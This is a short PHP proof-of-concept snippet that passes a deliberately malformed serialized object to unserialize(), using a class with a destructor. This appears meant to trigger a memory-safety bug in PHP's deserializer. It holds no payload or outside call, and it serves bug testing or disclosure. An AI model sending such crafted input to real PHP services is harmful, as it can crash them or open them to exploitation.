class obj { var $ryat; public function __destruct() { $this->ryat = null; } }
$poc = 'O:3:"obj":1:{';
var_dump(unserialize($poc));